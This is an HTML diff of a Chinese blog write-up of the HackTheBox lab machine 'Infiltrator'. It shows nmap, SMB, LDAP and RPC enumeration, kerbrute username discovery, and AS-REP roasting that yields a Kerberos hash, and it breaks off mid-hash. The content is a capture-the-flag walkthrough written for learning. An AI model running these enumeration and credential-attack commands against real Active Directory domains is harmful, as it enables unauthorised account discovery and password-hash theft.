@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recon &amp; EnumNmap Scan12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Infiltrator">
+<meta property="og:url" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/index.html">
+<meta property="og:site_name" content="一语成谶">
+<meta property="og:description" content="Recon &amp; EnumNmap Scan12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/Infiltrator.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115101539960.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115101554808.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115090601507.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115084920917.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115085852364.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115091817108.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115145558956.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115154323291.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116191458803.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115154520414.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115094907649.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115095258652.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115154707007.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115101948892.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115154907790.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115220410982.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115221022787.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115221037702.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115225212345.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115225250980.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241115231220340.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116122518554.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116123657192.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116193359013.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116193503990.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116193614297.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116194231536.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116194535973.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116194543660.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116123805275.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116123947880.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116123747034.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/image-20241116124041883.png">
+<meta property="article:published_time" content="2024-11-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-11-18T12:30:51.167Z">
+<meta property="article:author" content="Fermionorz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/Infiltrator.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/112745175">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://avatars.githubusercontent.com/u/112745175" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://avatars.githubusercontent.com/u/112745175">
+        
+      
+    
+    <!-- title -->
+    <title>Infiltrator</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="一语成谶" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/about">关于</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/11/12/HTB-MonitorsThree/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&text=Infiltrator"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&title=Infiltrator"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&is_video=false&description=Infiltrator"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Infiltrator&body=Check out this article: http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&title=Infiltrator"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&title=Infiltrator"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&title=Infiltrator"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&title=Infiltrator"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&name=Infiltrator&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&t=Infiltrator"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon-Enum"><span class="toc-number">1.</span> <span class="toc-text">Recon &amp; Enum</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap Scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS"><span class="toc-number">1.2.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Dir"><span class="toc-number">1.3.</span> <span class="toc-text">Web Dir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rpc"><span class="toc-number">1.4.</span> <span class="toc-text">Rpc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP"><span class="toc-number">1.5.</span> <span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-number">1.6.</span> <span class="toc-text">SMB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-M-Harris"><span class="toc-number">2.</span> <span class="toc-text">Shell as M.Harris</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-number">2.1.</span> <span class="toc-text">AS-REP Roasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Enum-user"><span class="toc-number">2.2.</span> <span class="toc-text">LDAP Enum user</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84"><span class="toc-number">2.3.</span> <span class="toc-text">密码喷射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-1"><span class="toc-number">2.4.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM"><span class="toc-number">2.5.</span> <span class="toc-text">WinRM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound"><span class="toc-number">2.6.</span> <span class="toc-text">BloodHound</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-Administrator"><span class="toc-number">3.</span> <span class="toc-text">Shell as Administrator</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Infiltrator
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Fermionorz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-13T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-11-14</time>
+        
+        (Updated: <time datetime="2024-11-18T12:30:51.167Z" class="dt-updated" itemprop="dateModified">2024-11-18</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Machines/">Machines</a> › <a class="category-link" href="/categories/Machines/Windows/">Windows</a> › <a class="category-link" href="/categories/Machines/Windows/Insane/">Insane</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <img src="/2024/11/13/HTB-Infiltrator/Infiltrator.png" class="">
+
+<h2 id="Recon-Enum"><a href="#Recon-Enum" class="headerlink" title="Recon &amp; Enum"></a>Recon &amp; Enum</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Infiltrator.htb</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-14 00:14:19Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Issuer: commonName=infiltrator-DC01-CA</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">| Not valid after:  2099-07-17T18:48:15</span><br><span class="line">| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b</span><br><span class="line">|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Issuer: commonName=infiltrator-DC01-CA</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">| Not valid after:  2099-07-17T18:48:15</span><br><span class="line">| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b</span><br><span class="line">|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Issuer: commonName=infiltrator-DC01-CA</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">| Not valid after:  2099-07-17T18:48:15</span><br><span class="line">| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b</span><br><span class="line">|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Issuer: commonName=infiltrator-DC01-CA</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">| Not valid after:  2099-07-17T18:48:15</span><br><span class="line">| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b</span><br><span class="line">|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.infiltrator.htb</span><br><span class="line">| Issuer: commonName=dc01.infiltrator.htb</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-07-30T13:20:17</span><br><span class="line">| Not valid after:  2025-01-29T13:20:17</span><br><span class="line">| MD5:   be1d:a071:bf6d:fff0:20c0:6b23:8e7e:1763</span><br><span class="line">|_SHA-1: cbda:6e22:6ccf:b5e7:534c:b9f0:d9e7:c5d8:dab9:769e</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: INFILTRATOR</span><br><span class="line">|   NetBIOS_Domain_Name: INFILTRATOR</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: infiltrator.htb</span><br><span class="line">|   DNS_Computer_Name: dc01.infiltrator.htb</span><br><span class="line">|   DNS_Tree_Name: infiltrator.htb</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-11-14T00:17:00+00:00</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">15220/tcp open  unknown</span><br><span class="line">15230/tcp open  unknown</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49691/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49692/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49723/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49736/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49877/tcp open  msrpc         Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
+
+<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>这里可以先挂后台跑，如果后面的枚举有新的成果，可以直接中断</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dns -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -d infiltrator.htb -o <span class="built_in">log</span>/dns.log -r infiltrator.htb</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115101539960.png" class="">
+
+<h3 id="Web-Dir"><a href="#Web-Dir" class="headerlink" title="Web Dir"></a>Web Dir</h3><p>这里可以先挂后台跑，如果后面的枚举有新的成果，可以直接中断</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt -o <span class="built_in">log</span>/web_dir.log -u http://infiltrator.htb/</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115101554808.png" class="">
+
+<h3 id="Rpc"><a href="#Rpc" class="headerlink" title="Rpc"></a>Rpc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient infiltrator.htb -U <span class="string">&#x27;guest%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115090601507.png" class="">
+<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://infiltrator.htb -s base </span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115084920917.png" class="">
+
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netexec smb infiltrator.htb -u guest -p &#x27;&#x27; --shares</span><br><span class="line">netexec smb infiltrator.htb -u guest -p &#x27;&#x27; --rid-brute 10000</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115085852364.png" class="">
+
+<h2 id="Shell-as-M-Harris"><a href="#Shell-as-M-Harris" class="headerlink" title="Shell as M.Harris"></a>Shell as M.Harris</h2><img src="/2024/11/13/HTB-Infiltrator/image-20241115091817108.png" class="">
+
+<p>在 Web 页面中发现了团队成员，保存名称</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">David Anderson</span><br><span class="line">Olivia Martinez</span><br><span class="line">Kevin Turner</span><br><span class="line">Amanda Walker</span><br><span class="line">Marcus Harris</span><br><span class="line">Lauren Clark</span><br><span class="line">Ethan Rodriguez</span><br></pre></td></tr></table></figure>
+
+<p>生成用户名组合，使用 kerbrute 枚举用户名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum --dc infiltrator.htb -d infiltrator.htb info/dic_user.list -o <span class="built_in">log</span>/kerbrute_username.log</span><br><span class="line">---</span><br><span class="line">...</span><br><span class="line">2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       D.Anderson@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       O.Martinez@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       K.Turner@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       A.Walker@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       M.Harris@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:40 &gt;  [+] VALID USERNAME:       E.Rodriguez@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:40 &gt;  [+] VALID USERNAME:       L.Clark@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:45 &gt;  Done! Tested 77 usernames (7 valid) <span class="keyword">in</span> 5.990 **seconds**</span><br></pre></td></tr></table></figure>
+
+<h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetNPUsers -no-pass -usersfile info/user.list infiltrator.htb/</span><br><span class="line">---</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] User D.Anderson doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User O.Martinez doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User K.Turner doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User A.Walker doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User M.Harris doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User E.Rodriguez doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">$krb5asrep$23<span class="variable">$L</span>.Clark@INFILTRATOR.HTB:59de0be66010a9b1a6d556b9dc40655c<span 